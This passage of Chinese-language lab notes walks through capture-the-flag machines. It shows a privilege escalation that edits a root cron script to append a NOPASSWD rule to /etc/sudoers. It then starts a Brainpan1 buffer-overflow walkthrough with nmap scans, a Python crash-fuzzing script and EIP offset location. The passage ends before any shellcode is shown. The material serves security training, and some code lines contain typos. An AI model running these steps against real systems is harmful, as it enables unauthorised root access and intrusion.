+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320155221533.png" alt="image-20251117205958544"></p>
+<p><strong>发现在&#x2F;var&#x2F;log&#x2F;目录下存在 cronlog 文件，该文件的语法含义是，每两分钟执行 cleaner.py</strong></p>
+<p><strong>找到这个 cleaner.py</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name cleaner.py 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320155221534.png" alt="image-20251117210804375"></p>
+<p><strong>发现有 os.system，可以执行系统命令</strong></p>
+<p><strong>vim 打开并修改，报错不用管，直接回车</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320155221535.png" alt="image-20251117210903798"></p>
+<p>**这条信息并不是 Python 脚本本身的报错，而是 **<strong>Vim 在退出时自己发出的警告</strong>——和 <code>cleaner.py</code> 写得好不好没关系。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320155221536.png" alt="image-20251117211150839"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;overflow ALL=(ALL)NOPASSWD:ALL&quot; &gt;&gt; /etc/sudoer</span><br></pre></td></tr></table></figure>
+
+<p><strong>直接回车。返回到 shell 界面，成功写入</strong></p>
+<p><strong>实战利用流程（CTF &#x2F; 渗透）</strong></p>
+<ol>
+<li><p>**拿到低权用户 **<code>overflow</code> 。</p>
+</li>
+<li><p><strong>发现文件属主是 root 且****带 SUID</strong>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-rwsr-xr-x 1 root root cleaner.py</span><br></pre></td></tr></table></figure>
+
+<p><strong>或发现它****被 cron&#x2F;root 定时执行</strong>。</p>
+</li>
+<li><p><strong>坐等脚本被 root 执行一次——</strong><code>/etc/sudoers</code> 瞬间被改写。</p>
+</li>
+<li><p>**低权用户直接 **<code>sudo su</code> &#x2F; <code>sudo bash</code> → <strong>无密码变 root</strong> → 拿 flag。</p>
+</li>
+</ol>
+<h3 id="虽然有报错，但跟写入文件内容无关，直接回车"><a href="#虽然有报错，但跟写入文件内容无关，直接回车" class="headerlink" title="虽然有报错，但跟写入文件内容无关，直接回车"></a>虽然有报错，但跟写入文件内容无关，直接回车</h3><p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320155221537.png" alt="image-20251117211734854"></p>
+<p><strong>现在可以看到，是跟我们要密码的，等个两分钟</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320155221538.png" alt="image-20251117211852121"></p>
+<p><strong>确实有全部权限，并且不用输密码</strong></p>
+<h2 id="root"><a href="#root" class="headerlink" title="root"></a>root</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo /bin/bash</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320155221539.png" alt="image-20251117212054004"></p>
+<h3 id="定妆照"><a href="#定妆照" class="headerlink" title="定妆照"></a>定妆照</h3><p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320155221540.png" alt="image-20251117212129971"></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><h3 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h3><p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320155221541.png" alt="image-20251117215142662"></p>
+<h3 id="问题和要点"><a href="#问题和要点" class="headerlink" title="问题和要点"></a>问题和要点</h3><p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320155221542.png" alt="image-20251117215457767"></p>
+<p><strong>其实既然是 root 执行自动任务，可以直接用</strong><a target="_blank" rel="noopener" href="https://search.bilibili.com/all?from_source=webcommentline_search&keyword=msf&seid=3643126449318514085&from_avid=517614458&from_comid=182673097392"><img src="https://i0.hdslb.com/bfs/reply/9f3ad0659e84c96a711b88dd33f4bc2e945045e0.png" alt="img">msf</a>生成的反弹 shell 代码，弹回来就是 root 权限</p>
+<p><strong>vi 写不进去，有啥招没。进 vi 之前给环境变量试试：export TERM&#x3D;xterm-color</strong></p>
+<h1 id="靶机精讲：Brainpan1-缓冲区溢出典型利用过程，让你一次吃透。"><a href="#靶机精讲：Brainpan1-缓冲区溢出典型利用过程，让你一次吃透。" class="headerlink" title="靶机精讲：Brainpan1 - 缓冲区溢出典型利用过程，让你一次吃透。"></a>靶机精讲：Brainpan1 - 缓冲区溢出典型利用过程，让你一次吃透。</h1><p><strong>靶机精讲之 Brainpan1，详细讲解缓冲区溢出漏洞的识别、重现，讲解定位 eip、寄存器扩容、坏字节识别、jmp esp 定位，payload 生成等细节技术，从零开始手工编写漏洞利用代码，详细讲解编译器 Immunity Debugger 的实操，最后成功利用缓冲区漏洞获得系统权限。提权阶段利用 sudoers 文件的提示，启动 manual 高权限环境，在权限上下文中，开启新的 bash 进程，获得系统 root 权限。缓冲区漏洞利用入门的教科书，非常标准的利用过程，期待对你有帮助。</strong></p>
+<h2 id="nmap-扫描-1"><a href="#nmap-扫描-1" class="headerlink" title="nmap 扫描"></a>nmap 扫描</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -sn 192.168.95.0/24</span><br><span class="line">sudo nmap -sT --min-rate 10000 -p- 具体ip</span><br><span class="line">sudo nmap -sU --min-rate 10000 -p- ip</span><br><span class="line">sudo nmap -sT -sV -sC -O -p,,, ip</span><br><span class="line">sudo nmap --script=vuln -p,,, ip</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><code>sudo nmap -sn 192.168.95.0/24</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320155406385.png" alt="image-20251202191622357"></p>
+<p><code>sudo nmap -sT --min-rate 10000 -p- 具体ip</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320155406386.png" alt="image-20251202191707434"></p>
+<p><code>sudo nmap -sU --min-rate=10000 -p- ip</code></p>
+<p><code>sudo nmap -sT -sV -sC -O -p,,, ip</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320155406387.png" alt="image-20251202192230976"></p>
+<p><code>sudo nmap --script=vuln -p,,, ip</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320155406388.png" alt="image-20251202192347398"></p>
+<h2 id="web-渗透测试"><a href="#web-渗透测试" class="headerlink" title="web 渗透测试"></a>web 渗透测试</h2><h3 id="目录爆破"><a href="#目录爆破" class="headerlink" title="目录爆破"></a>目录爆破</h3><h4 id="wfuzz"><a href="#wfuzz" class="headerlink" title="wfuzz"></a><code>wfuzz</code></h4><p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320155406389.png" alt="image-20251202192633672"><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320155406390.png" alt="image-20251202193617730"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xwfuzz -w 指定字典/usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt --hc 404 http://ip:port/FUZZBASH</span><br></pre></td></tr></table></figure>
+
+<p><code>-w</code> 指定字典**		<strong><code>--hc 404</code> 隐藏无法访问的 404 页面</strong>		**<code>http://ip:port/FUZZ</code> FUZZ 是爆破位置</p>
+<h4 id="gobuster"><a href="#gobuster" class="headerlink" title="gobuster"></a><code>gobuster</code></h4><p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320155406391.png" alt="image-20251202195235882"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -w 字典 -u http://ip/port</span><br></pre></td></tr></table></figure>
+
+<p>**只有一个 **<code>/bin</code> 目录</p>
+<h3 id="10000-端口"><a href="#10000-端口" class="headerlink" title="10000 端口"></a>10000 端口</h3><p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320155406392.png" alt="image-20251202193048770"></p>
+<p><strong>没有连接，只有图片。</strong></p>
+<p><strong>查看源码：标准的 html 静态页面，没用任何动态信息</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320155406393.png" alt="image-20251202193211261"></p>
+<h4 id="bin-目录"><a href="#bin-目录" class="headerlink" title="&#x2F;bin 目录"></a>&#x2F;bin 目录</h4><p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320155406394.png" alt="image-20251202193357063"></p>
+<p><strong>“头盖骨.可执行文件”</strong>	**kali 下载下来 **<code>wget</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320155406395.png" alt="image-20251202193948109"></p>
+<h4 id="对可执行文件进行详细调查"><a href="#对可执行文件进行详细调查" class="headerlink" title="对可执行文件进行详细调查"></a>对可执行文件进行详细调查</h4><h5 id="file"><a href="#file" class="headerlink" title="file"></a>file</h5><p><strong>查看是什么类型的文件：Windows 的 32 位可执行文件</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320155406396.png" alt="image-20251202194344315"></p>
+<h5 id="binwalk"><a href="#binwalk" class="headerlink" title="binwalk"></a>binwalk</h5><p><strong>看有无捆绑：无</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320155406397.png" alt="image-20251202194459439"></p>
+<h5 id="strings"><a href="#strings" class="headerlink" title="strings"></a>strings</h5><p><strong>查看可读字符串，包含</strong><code>32位</code> <code>copied</code> <code>buffer(译为缓冲区)</code> <code>突兀字符串shitstorm</code> <code>9999端口的banner</code> <code>下面是程序信息</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320155406398.png" alt="image-20251202194944748"></p>
+<p><strong>给</strong><code>9999端口</code> 输入可执行程序里面的 <code>突兀字符串</code> 就可以 “允许访问”**	**但没什么效果</p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320155406399.png" alt="image-20251202194736064"></p>
+<h3 id="9999-端口"><a href="#9999-端口" class="headerlink" title="9999 端口"></a>9999 端口</h3><p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320155406400.png" alt="image-20251202193845425"></p>
+<p><strong>跟</strong><code>nmap</code> 详细信息扫描结果一样 <code>banner</code></p>
+<p><strong>用</strong><code>nc</code> 尝试连接这台机器的这个端口，进行交互**	**<code>&gt;&gt;</code> 处可以输入，回车显示结果“不能访问”</p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320155406401.png" alt="image-20251202194137771"></p>
+<p><strong>而输入可执行程序里面的字符串就可以 “允许访问”</strong>	<strong>但没什么效果</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320155406399.png" alt="image-20251202194736064"></p>
+<p>**这里我们就走到头了，可交互的地方都试过了，能进行操作的只有可执行程序 **<code>brainpan.exe</code>，而又因为 <code>brainpan.exe</code> 和 <code>9999端口</code> 页面一致，<strong>严重怀疑是用的相同程序</strong></p>
+<h2 id="对可执行程序-brainpan-exe-进行操作"><a href="#对可执行程序-brainpan-exe-进行操作" class="headerlink" title="对可执行程序 brainpan.exe 进行操作"></a>对可执行程序 <code>brainpan.exe</code> 进行操作</h2><p><strong>拿到 Windows 环境下，用</strong><code>系统管理员cmd</code> 执行</p>
+<p><strong>提示我们：初始化一个</strong><code>winsock</code>，等待连接</p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320155406402.png" alt="image-20251202195840904"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320155406403.png" alt="image-20251202195825949"></p>
+<p><strong>那我们就在 kali 中尝试</strong><code>nc</code> 连接，依旧连接输入 <code>shitstorm</code> 后，发现 Windows 上说，<strong>复制了九个字节到缓冲区</strong>下面又说<strong>接受连接，即连接成功</strong></p>
+<ul>
+<li><strong>程序在接收输入后，会把这 9 个字符 “复制到内存缓冲区”—— 这是程序处理输入的常规步骤</strong><strong>（先把用户输入存到内存临时区域 即：缓冲区，再进行验证等操作）。</strong></li>
+</ul>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320155406404.png" alt="image-20251202195950760"></p>
+<p><strong>这种提示就让我们联想到****缓冲区溢出漏洞</strong></p>
+<p><strong>下面就转化成对</strong><code>brainpan.exe</code> 的缓冲区溢出漏洞的发现和利用</p>
+<blockquote>
+<p><strong>[!NOTE]</strong></p>
+<p>**简单说，**<strong>缓冲区溢出漏洞是程序的一种内存错误</strong>，本质是 “输入数据超过了程序给缓冲区分配的内存大小，导致多余数据覆盖了其他内存区域”，进而引发安全问题。</p>
+<h3 id="核心逻辑（以你的场景举例）："><a href="#核心逻辑（以你的场景举例）：" class="headerlink" title="核心逻辑（以你的场景举例）："></a>核心逻辑（以你的场景举例）：</h3><p><strong>比如程序给 “密码输入” 分配了****9 字节的缓冲区</strong>（刚好存 <code>shitstorm</code>）：</p>
+<ul>
+<li><strong>如果输入正常长度（比如 9 字节）→ 没问题；</strong></li>
+<li><strong>如果输入超长内容（比如 20 字节）→ 多余的 11 字节会 “溢出” 到缓冲区旁边的内存（比如程序的 “指令地址” 区域）。</strong></li>
+</ul>
+<h3 id="后果："><a href="#后果：" class="headerlink" title="后果："></a>后果：</h3><p>**攻击者可以通过构造超长恶意输入，**<strong>覆盖程序的关键内存数据</strong>（比如把 “返回指令地址” 改成恶意代码的地址），最终让程序执行攻击者的代码（比如获取服务器权限）。</p>
+<p><strong>&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;</strong></p>
+<p><strong>典型利用步骤</strong>（以你场景里的 <code>brainpan</code> 程序为例）：</p>
+<h3 id="1-确定缓冲区长度"><a href="#1-确定缓冲区长度" class="headerlink" title="1. 确定缓冲区长度"></a>1. 确定缓冲区长度</h3><ul>
+<li><strong>用 “逐步加长的垃圾数据” 测试（比如先输 10 字节、20 字节…），直到程序崩溃 —— 崩溃时的输入长度，就是缓冲区的大致容量（比如测试出</strong><code>brainpan</code> 的缓冲区是 524 字节）。</li>
+</ul>
+<h3 id="2-覆盖-“返回地址”"><a href="#2-覆盖-“返回地址”" class="headerlink" title="2. 覆盖 “返回地址”"></a>2. 覆盖 “返回地址”</h3><ul>
+<li><strong>缓冲区溢出后，多余数据会覆盖程序的 “返回地址”（程序执行完当前代码后要跳转到的位置）。</strong></li>
+<li><strong>用工具（比如</strong><code>pattern_create</code>）生成 “唯一特征的垃圾数据”，通过崩溃时的内存信息，找到 “返回地址” 在输入数据中的位置（比如第 525-528 字节是返回地址区域）。</li>
+</ul>
+<h3 id="3-构造恶意输入"><a href="#3-构造恶意输入" class="headerlink" title="3. 构造恶意输入"></a>3. 构造恶意输入</h3><ul>
+<li><strong>拼接输入内容：</strong><code>[垃圾数据填满缓冲区] + [要跳转的恶意代码地址] + [实际要执行的恶意代码（比如获取shell的指令）]</code>。</li>
+</ul>
+<h3 id="4-执行攻击"><a href="#4-执行攻击" class="headerlink" title="4. 执行攻击"></a>4. 执行攻击</h3><ul>
+<li><strong>把构造好的恶意输入发送给程序，程序执行到返回指令时，会跳转到恶意代码的地址，最终执行攻击者的命令（比如获取目标机器的控制权限）。</strong></li>
+</ul>
+</blockquote>
+<h2 id="缓冲区漏洞的识别"><a href="#缓冲区漏洞的识别" class="headerlink" title="缓冲区漏洞的识别"></a>缓冲区漏洞的识别</h2><p>*<em>编写</em>***多长字节造成缓冲区溢出？**的脚本 <code>sudo vim exploit.py</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">import socket</span><br><span class="line">import time</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">size = 100</span><br><span class="line"></span><br><span class="line">while True:</span><br><span class="line">    try:</span><br><span class="line">        print &quot;\n[+] Send evil buffer %s bytes&quot; % size</span><br><span class="line">        buffer = &#x27;A&#x27; * size</span><br><span class="line"></span><br><span class="line">        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">        s = connect((&quot;192.168.95.1&quot;,9999))</span><br><span class="line">        s.send(buffer)</span><br><span class="line">        s.close()</span><br><span class="line"></span><br><span class="line">        size += 100</span><br><span class="line">        time.sleep(3)</span><br><span class="line"></span><br><span class="line">    except:</span><br><span class="line">        print &quot;\n[+] Could not connect.&quot;</span><br><span class="line">        sys.exit()</span><br></pre></td></tr></table></figure>
+
+<h3 id="代码解释："><a href="#代码解释：" class="headerlink" title="代码解释："></a>代码解释：</h3><p><strong>这是一个****缓冲区溢出的 “长度测试脚本”</strong>，作用是自动测试目标程序的缓冲区容量，步骤如下：</p>
+<ol>
+<li><strong>初始化</strong>：导入网络、时间、系统库，设置初始输入长度 <code>size=100</code>。</li>
+<li><strong>循环发送数据</strong>：<ul>
+<li><strong>每次生成</strong><code>size</code> 个字符 <code>A</code>（“垃圾数据”）作为测试输入；</li>
+<li><strong>通过 socket 连接目标 IP（192.168.95.1）的 9999 端口，发送这组数据；</strong></li>
+<li><strong>发送后关闭连接，然后将</strong><code>size</code> 增加 100，等待 3 秒后重复。</li>
+</ul>
+</li>
+<li><strong>异常处理</strong>：如果连接失败（说明目标程序因缓冲区溢出崩溃），则打印提示并退出。</li>
+</ol>
+<h3 id="核心目的："><a href="#核心目的：" class="headerlink" title="核心目的："></a>核心目的：</h3><p><strong>通过逐步增大输入长度，找到 “让目标程序崩溃的最小长度”—— 这个长度就是目标程序的缓冲区容量（溢出临界点），为后续构造恶意溢出 payload 做准备。</strong></p>
+<p>**执行 **<code>.py</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320155406405.png" alt="image-20251202202004897"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320155406406.png" alt="image-20251202202126328"></p>
+<p><strong>可以看到，两边都是发送&#x2F;拷贝了 600 字节之后就不再运行了，也就是****不超过 600 个字节</strong>就会导致缓冲区溢出</p>
+<p><strong>具体是多少字节呢？</strong></p>
+<p><strong>生成****唯一特征的字符串（模式串）</strong>，核心用途是<strong>定位缓冲区溢出的 “返回地址偏移量”</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf-pattern_create -l 600</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320155406407.png" alt="image-20251202202424140"></p>
+<p><strong>修改我们的脚本</strong>	<strong>#size 相关的都不重要了</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">import socket</span><br><span class="line">import time</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">size = 600</span><br><span class="line"></span><br><span class="line">try:</span><br><span class="line">        print &quot;\n[+] Send evil buffer %s bytes&quot; % size</span><br><span class="line">        buffer = &#x27;msf-pattern_create -l 600的大串结果&#x27;</span><br><span class="line"></span><br><span class="line">        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">        s = connect((&quot;192.168.95.1&quot;,9999))</span><br><span class="line">        s.send(buffer)</span><br><span class="line">        s.close()</span><br><span class="line"></span><br><span class="line">        size += 100</span><br><span class="line">        time.sleep(3)</span><br><span class="line"></span><br><span class="line"> except:</span><br><span class="line">        print &quot;\n[+] Could not connect.&quot;</span><br><span class="line">        sys.exit()</span><br></pre></td></tr></table></figure>
+
+<h2 id="Immunity-Debug"><a href="#Immunity-Debug" class="headerlink" title="Immunity Debug"></a><code>Immunity Debug</code></h2><blockquote>
+<p><strong>[!CAUTION]</strong></p>
+<p><strong>前情需要：</strong></p>
+<p><strong>了解动态编译，动态编译的工具，简单的汇编语言，寄存器的知识，反汇编的原理</strong></p>
+<p><strong>缓冲区溢出漏洞不需要对汇编&#x2F;逆向了解的很透，只是一点点</strong></p>
+</blockquote>
+<blockquote>
+<p><strong>[!NOTE]</strong></p>
+<p><strong><code>Immunity Debug</code> 这个工具的作用</strong></p>
+<p><strong>作为中间代理：在程序和 CPU 之间，做一个代理 处理&#x2F;分析中间有用数据，观察执行的过程。</strong></p>
+<p><strong>判断：有没有缓冲区溢出漏洞？能不能加入我们的反弹 shell 命令？能加在哪里？怎么加？</strong></p>
+</blockquote>
+<p><strong>左上角 File-Open-brainpan.exe</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320155406408.png" alt="image-20251202203042324"></p>
+<p><strong>打开后有四个主要窗口，</strong></p>
+<p><strong>左上：汇编语言窗口，描述程序的执行过程，程序流</strong></p>
+<p><strong>右上：寄存器窗口，若干寄存器的数据在里面是怎么存放的（通用寄存器都是干什么的）</strong></p>
+<p><strong>左下：内存的窗口</strong></p>
+<p><strong>右下：堆栈的窗口</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320155406409.png" alt="image-20251203200636359"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320155406410.png" alt="image-20251202204027679"><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320155406411.png" alt="image-20251202204045797"><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320155406412.png" alt="image-20251202204056605">  先让程序跑起来，然后 kali 执行脚本</p>
+<p><strong>看到我们 kali 给的特殊字符串放在了 EDX 中，不够装又放到了 ESP 中</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320155406413.png" alt="image-20251202204755065"></p>
+<blockquote>
+<p><strong>[!IMPORTANT]</strong></p>
+<p><strong>但****最重要</strong>的是 <strong>EIP(指令指针：指向下一条指令的地址)</strong>   也就是告诉我们，下一条指令在我们给他的特殊字符串的位置是 35724134</p>
+<p><strong>&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;</strong></p>
+<p><strong>EIP 是 *<em><strong>x86 架构 CPU 中的 “指令指针寄存器”（Instruction Pointer）</strong>，它的核心作用是</em>*存储 “下一条要执行的 CPU 指令在内存中的地址”</strong>。</p>
+<h3 id="关键特点："><a href="#关键特点：" class="headerlink" title="关键特点："></a>关键特点：</h3><ol>
+<li><strong>程序执行的 “导航仪”</strong>：CPU 会根据 EIP 里的地址，从内存中读取对应的指令并执行；执行完这条指令后，EIP 会自动更新为 “下一条指令的地址”，让程序持续运行。</li>
+<li><strong>缓冲区溢出的核心目标</strong>：在漏洞攻击中，攻击者通过缓冲区溢出覆盖 EIP 的值，就能让 CPU 跳转到攻击者指定的地址（比如恶意代码的位置），从而控制程序执行流程。</li>
+</ol>
+<p><strong>举个例子：如果程序正常运行时 EIP 是</strong><code>0x00401000</code>，说明 CPU 接下来要执行内存地址 <code>0x00401000</code> 处的指令；若被溢出覆盖成 <code>0x00123456</code>，CPU 就会跳去执行 <code>0x00123456</code> 处的内容。</p>
+</blockquote>
+<p><strong>接下来就用生成特殊字符串的对应工具，定位 EIP 位置</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf-pattern_offser -l 600 -q 35724134</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320155406414.png" alt="image-20251202205448396"></p>
+<p><strong>也就是说</strong><code>35724134</code> 的四个字节， 在 524 往后的 525 526 527 528 ，这里面填充 EIP</p>
+<p><strong>524 是开始溢出的点，后面 4 位是 EIP 的内存地址</strong></p>
+<p>**修改我们的 **<code>exploit.py</code> 确认 EIP 地址是否是 <code>525 526 527 528</code> 后面的 72 是因为 600 个字节能让程序崩溃，就给他凑够 600 个</p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320155406415.png" alt="image-20251202211038649"></p>
+<p><strong>重启</strong><code>Immunity Debug</code> 运行 <code>brainpan.exe</code> 然后执行我们修改的 payload</p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320155406416.png" alt="image-20251202210403090"></p>
+<p><strong>A 524 个；B 4 个；C 72 个</strong></p>
+<p><strong>这里的 41，42，43 是</strong><code>16进制</code> 的 A,B,C 对应的 ascii**	**10 进制 65 对应的十六进制是 41——计算——16x4+1x1&#x3D;65</p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320155406417.png" alt="image-20251202210524491"></p>
+<p><strong>成功确认定位到</strong><code>eip</code> 的位置</p>
+<h2 id="esp-扩容"><a href="#esp-扩容" class="headerlink" title="esp 扩容"></a>esp 扩容</h2><blockquote>
+<p><strong>[!NOTE]</strong></p>
+<p><strong>ESP 是 *<em><strong>x86 架构 CPU 中的 “栈指针寄存器”（Extended Stack Pointer）</strong>，它的核心作用是</em>*存储当前程序栈（Stack）的栈顶地址</strong>。</p>
